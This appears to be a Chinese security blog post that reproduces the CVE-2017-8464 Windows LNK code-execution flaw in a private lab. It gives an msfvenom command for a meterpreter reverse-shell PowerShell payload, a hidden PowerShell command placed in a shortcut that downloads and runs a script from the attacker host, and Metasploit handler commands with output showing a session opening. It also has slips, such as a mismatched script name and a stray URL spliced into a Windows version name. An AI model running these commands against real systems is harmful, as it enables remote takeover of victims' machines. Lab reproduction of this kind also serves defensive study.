---
title: CVE-2017-8464 LNK 远程代码执行漏洞
layout: post
tags:
  - sec
  - hack
  - exploit
  - cve
category: 
  - hack
  - sec
comments: true
share: true
---
CVE-2017-8464:攻击者可以向用户呈现包含恶意的.LNK文件和相关联的恶意二进制文件的可移动驱动器或远程共享。 当用户在Windows资源管理器或解析.LNK文件的任何其他应用程序中打开此驱动器（或远程共享）时，恶意二进制程序将在目标系统上执行攻击者选择的代码，成功利用此漏洞的攻击者可以获得与本地用户相同的用户权限。

* TOC
{:toc}

<!--more-->

漏洞影响范围: 

- 桌面系统
  - Microsoft Windows 10 Version 1607 for 32-bit Systems
  - Microsoft Windows 10 Version 1607 for x64-based Systems
  - Microsoft Windows 10 for 32-bit Systems
  - Microsoft Windows 10 for x64-based Systems
  - Microsoft Windows 10 version 1511 for 32-bit Systems
  - Microsoft Windows 10 version 1511 for x64-based Systems
  - Microsoft Windows 10 version 1703 for 32-bit Systems
  - Microsoft Windows 10 version 1703 for x64-based Systems
  - Microsoft Windows 7 for 32-bit Systems SP1
  - Microsoft Windows 7 for x64-bhttps://www.baidu.com/ased Systems SP1
  - Microsoft Windows 8.1 for 32-bit Systems
  - Microsoft Windows 8.1 for x64-based Systems
  - Microsoft Windows RT 8.1
- 服务器系统
  - Microsoft Windows Server 2008 R2 for Itanium-based Systems SP1
  - Microsoft Windows Server 2008 R2 for x64-based Systems SP1
  - Microsoft Windows Server 2008 for 32-bit Systems SP2
  - Microsoft Windows Server 2008 for Itanium-based Systems SP2
  - Microsoft Windows Server 2008 for x64-based Systems SP2
  - Microsoft Windows Server 2012
  - Microsoft Windows Server 2012 R2
  - Microsoft Windows Server 2016

攻击原理：创建恶意快捷方式，包含恶意执行脚本，点击恶意快捷方式，导致本机被攻击
实验平台：攻击机Kali2（192.168.15.129），靶机win7 x64（192.168.15.130）

## 利用msfvenom生成test.ps1

利用msf的msfvenom执行`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.15.129 LPORT=6666 -f psh-reflection > test.ps1`

![msfvenom.png](/img/hack/利用lnk攻击/msfvenom.png)

## 将test脚本复制到服务器文件夹

复制powershell脚本到`var/www/html`文件夹中，开启服务器功能：

```javascript
root@kali:~# cp test.ps1  /var/www/html
root@kali:~# cd /var/www/html/
root@kali:/var/www/html# ls
index.html  test.ps1
root@kali:/var/www/html# service apache2 start
```





## 创建快捷方式

在靶机上创建快捷方式。
右键打开新建快捷方式，键入`powershell -windowstyle hidden -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.15.129/search.ps1');test.ps1"`,进行下一步。完成快捷方式创建


![创建快捷方式1.png](/img/hack/利用lnk攻击/创建快捷方式1.png)

![创建快捷方式2.png](/img/hack/利用lnk攻击/创建快捷方式2.png)

## 攻击

在kali下创建监听反弹：

```javascript
msf > use exploit/multi/handler 

msf exploit(handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp

msf exploit(handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target



msf exploit(handler) > set LHOST 192.168.15.129
LHOST => 192.168.15.129

msf exploit(handler) > set LPORT 6666
LPORT => 6666

msf exploit(handler) > run

[*] Started reverse TCP handler on 192.168.15.129:6666 
[*] Starting the payload handler...
[*] Sending stage (1189935 bytes) to 192.168.15.130
[*] Meterpreter session 1 opened (192.168.15.129:6666 -> 192.168.15.130:49717) at 2017-06-17 04:19:16 -0400
```

![创建监听.png](/img/hack/利用lnk攻击/创建监听.png)




## 打开快捷方式

打开快捷方式，执行了攻击命令，反弹出靶机的meterpreter

![反弹成功.png](/img/hack/利用lnk攻击/反弹成功.png)


![使用shell.png](/img/hack/利用lnk攻击/使用shell.png)

使用360检测，报毒被查杀
![360报毒.png](/img/hack/利用lnk攻击/360报毒.png)






参考：[1.（亲测复现）Microsoft Windows CVE-2017-8464 LNK 远程代码执行漏洞](http://www.secfree.com/3193.html)http://www.secfree.com/3193.html 